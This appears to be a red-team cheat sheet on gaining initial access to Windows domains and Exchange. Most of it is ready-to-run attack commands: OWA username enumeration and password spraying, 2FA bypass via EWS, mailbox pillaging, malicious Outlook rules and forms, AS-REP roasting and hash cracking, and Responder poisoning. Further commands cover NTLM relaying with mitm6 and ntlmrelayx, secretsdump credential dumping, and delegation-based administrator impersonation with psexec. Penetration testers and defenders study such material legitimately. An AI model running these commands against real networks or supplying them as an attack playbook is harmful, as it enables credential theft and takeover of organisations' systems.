# Initial Access attacks
* [From the outside](#From-the-outside)
  * [Web Attacks](#Web-Attacks)  
  * [Password Attacks](#Password-Attacks)
    * [Exchange / OWA](#Exchange-/-OWA)
* [From the inside](#From-the-inside)
  * [Web Attacks](#Web-Attacks2) 
  * [Password Attacks](#Password-Attacks2)
    * [Enumerate users](#Enumerate-users)
    * [AS-REP Roasting](#AS-REP-Roasting)
    * [Exchange / OWA](#Exchange-/-OWA2)
  * [Relaying Attacks](#Relaying-Attacks)
      * [SMB relaying](#SMB-relaying)
      * [LDAP Relaying](#LDAP-Relaying)
      * [LDAPS Relaying](#LDAPS-Relaying)
        * [Resource Based Constrained Delegation Webclient Attack](#Resource-Based-Constrained-Delegation-Webclient-Attack)

# From the outside
## Web Attacks
- It is possible to get access by abusing a lot of web attacks which might give you access to the system. There are to many to subscribe here, but I might make a list someday.

## Password Attacks
### Exchange / OWA
- Attack path could be: Reconnaissance --> OWA Discovery --> Internal Domain Discovery --> Naming scheme fuzzing --> Username enumeration --> Password discovery --> GAL Extraction --> More Password discovery --> 2fa bypass --> Remote Access through VPN/RDP / Malicious Outlook Rules or Forms / Internal Phishing

#### Collection of data (OSINT)
- Collect e-mail adresses, usernames, passwords, get the email/user account naming scheme with tools such as:
  - https://github.com/mschwager/fierce
  - https://www.elevenpaths.com/innovation-labs/technologies/foca
  - https://github.com/lanmaster53/recon-ng
  - https://github.com/leebaird/discover
  - https://github.com/laramies/theHarvester

#### Domain name discovery
- https://github.com/dafthack/MailSniper
```
Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME>
Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME> -OutFile <POTENTIAL_DOMAINS.TXT> -CompanyName "TARGET NAME"
```
- Internal Domain name may be found inside a SSL Certificate

#### Name scheme fuzzing
- Create a username list from the OSINT
- Could use https://github.com/dafthack/EmailAddressMangler to generate mangled username list
```
Invoke-EmailAddressMangler -FirstNamesList <TXT> -LastNameList <TXT> -AddresConvention fnln | Out-File -Encoding ascii possible-usernames.txt
```

- https://gist.github.com/superkojiman/11076951
```
/opt/namemash.py names.txt >> possible-usernames.txt
```

#### Username Enumeration
- https://github.com/dafthack/MailSniper
```
Invoke-UsernameHarvestOWA -Userlist possible-usernames.txt -ExchHostname <EXCH HOSTNAME> -DOMAIN <IDENTIFIED INTERNAL DOMAIN NAME> -OutFile domain_users.txt
```

#### Password discovery
- https://github.com/dafthack/MailSniper
- https://github.com/byt3bl33d3r/SprayingToolkit
- OPSEC: Passwordspraying with a lot of attempts and quickly is LOUD and may count towards domain lockout policy!
```
Invoke-PasswordSprayOWA -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
Invoke-PasswordSprayEWS -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile ews-sprayed-creds.txt
```

#### Global Address List (GAL) Extraction
- https://els-cdn.content-api.ine.com/09f3f35f-6f69-4a9d-90be-d13046e692c0/index.html#
```
Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
```
- Then you could spray passwords again to get access to more mail accounts!

#### Bypassing 2fa
- Can check by server responses if supplied password is correct or not.
- Most 2FA vendors do not cover all available Exchange protocols. Owa might be protected but EWS might not be!

```
# Access through EWS
Invoke-SelfSearch -Mailbox <MAIL ADDRESS> -ExchHostname <DOMAIN NAME> -remote
```

#### Spreading the compromise
- Pillaging mailboxes for credentials/sensitive data
  -  https://github.com/milo2012/owaDump (--keyword option)
  -  https://github.com/dafthack/MailSniper (Invoke-SelfSearch)
  -  https://github.com/xorrior/EmailRaider (Invoke-MailSearch)
- Internal phishing
  - Mail from internal email adresses to targets.
- Malicious Outlook rules
  - Two interested options: Start application and run a script (Start application is synced through Exchange server, run a script is not)
  - Since Outlook 2016 both options are disabled by default
  - Attack prequisites:
    - Identification of valid credentials
    - Exchange Service Access (via RPC or MAPI over HTTP)
    - Malicious file dropped on disk (Through WebDAV share using UNC or local SMB share when physically inside) 
  - The attack:
    - Create a malicious executable (EXE, HTA, BAT, LNK etc.) and host it on an open WebDAV share
    - Create a malicious Outlook rule using the rulz.py script, pointing the file path to your WebDAV share
      - https://gist.github.com/monoxgas/7fec9ec0f3ab405773fc
    - Run a local Outlook instance using the target's credentials and import the malicious rule you created (File --> Manager Rules & Alerts --> Options --> Improt rules)
    - Send the trigger email. 
- Malicious Outlook Forms
  - If the path is applied that disables Run Application and Run Script rules this still works!
  - Attack prequisites:
    - Identification of valid credentials
    - Exchange service access 
  - KB4011091 for outlook 2016 seems to block VBSCript in forms
  - https://github.com/sensepost/ruler/wiki/Forms
  - ```.\ruler --email <EMAIL> form add --suffix form_name --input /tmp/command.txt --send```

# From the inside
## Web Attacks2
- It is possible to get access by abusing a lot of web attacks which might give you access to the system. There are to many to subscribe here, but I might make a list someday.

## Password Attacks2
### Enumerate users
- https://github.com/ropnop/kerbrute
```
sudo ./kerbrute userenum -d <domain> domain_users.txt -dc <IP>
```

#### Spray one password against all users
- Use ```--continue-on-success``` too keep going after 1 successful login
```
crackmapexec smb <DC IP> -d <DOMAIN> -u domain_users.txt -p <PASSWORD LIST> | tee passwordspray.txt
```

### AS-REP Roasting
```
python3 GetNPUsers.py <DOMAIN>/ -usersfile domain_users.txt -format hashcat -outputfile AS_REP_hashcat.txt
```

#### Crack hashes with hashcat
```
hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

### Exchange / OWA
- All the attacks from the outside works from the inside!

#### Enumerate all mailboxes
- https://github.com/dafthack/MailSniper
```
Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
```

#### Check access to mailboxes with current user
- https://github.com/dafthack/MailSniper
```
Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
```

#### Read e-mails
- https://github.com/dafthack/MailSniper
- The below command looks for terms like pass, creds, credentials from top 100 emails
```
Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
```

## Relaying attacks
- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/

#### Check if LLMNR and NBT-NS is used
- Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
- Use ```-A``` for analyze mode.
```
Responder -I eth0 -A
```

### SMB relaying
#### Check for SMB hosts without SMB signing
```
crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
```

#### Poison Requests
```
Responder -I eth0
```

#### Relay requests SMB and dump SAM
- we have to modify the Responder.conf file and disable the HTTP and SMB servers (as NTLM relay will be our SMB and HTTP server).
- the ```-d``` flag has now been changed from “Enable answers for NETBIOS domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False” to “Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False”. It should also be noted that ```-d``` as it is now CAN have an impact on your client’s network, as you are effectively poisoning the WPAD file over DHCP, which does not always revert back immediately once you stop the attack. It will likely require a reboot.
```
Responder -I eth0
ntlmrelayx.py -tf smb_hosts_nosigning.txt 
```

#### Relay requests SMB and keep SMB sessions open
- Use the ```socks``` option to be able to use the ```socks``` command to get a nice overview of the relayed attempts. It will also keep the SMB connection open indefinitely. 

```
Responder -I eth0
ntlmrelayx.py -tf smb_hosts_nosigning.txt --socks

# Get overview of all relay attempts
ntlmrelayx> socks

# Change socks proxy
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080

# Use proxychains and it will ignore the password value and use the relay credential instead
proxychains python3 secretsdump.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>

# Also possible to access shares on the network, for example if user is not local admin
proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
```

### LDAP Relaying
- With mitm6
- In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.
- However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.
- Spoof any requests for internal resources

```
sudo mitm6 -d <DOMAIN> --ignore-nofqdn
ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6
```

### LDAPS Relaying
- Relaying LDAPS can add a new computer account by abusing the fact that, by default, user are allowed to join domain up to 10 new computer objects

#### Enable the LDAPS relay
- Can wait for mitm6 to poison or force it
```
sudo mitm6 -d <DOMAIN> --ignore-nofqdn

ntlmrelayx.py -t ldaps://<DC IP> --add-computer <COMPUTER NAME>
```

- When computer account is created. This account can be used to enumerate the domain!

### Resource Based Constrained Delegation Webclient Attack
- Requirements:
  - On a Domain Controller to have the LDAP server signing not enforced (default value) (Requires authentication to check)
  - On a Domain Controller to have the LDAPS channel binding not required (default value)
  - Able to add new machines accounts (default value this quota is 10) (Requires authentication to check)
  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity) (Requires authentication to check)
  - A DNS record pointing to the attacker’s machine (By default authenticated users can do this) (Requires authentication to add)

#### Check LDAPS Binding
- https://github.com/zyn3rgy/LdapRelayScan
```
python3 LdapRelayScan.py -method LDAPS -dc-ip <IP>
```

#### Start mitm6 and NTLMRelay
```
sudo mitm6 -d <DOMAIN> --ignore-nofqdn
sudo ntlmrelayx.py -t ldaps://<DC IP> --delegate-access 
```

- When computer account is created. This account can be used to enumerate the domain!

#### Check for a user to impersonate
- Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
```
$creds = Get-Credential
Get-DomainUser -Credential $creds -Domain <DOMAIN> -Server <DC IP> | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
```

#### Impersonate any user and exploit
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
```
getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
Export KRB5CCNAME=administrator.ccache
python3 Psexec.py -k -no-pass <TARGET FQDN>
python3 Secretsdump.py -k <TARGET FQDN>
```
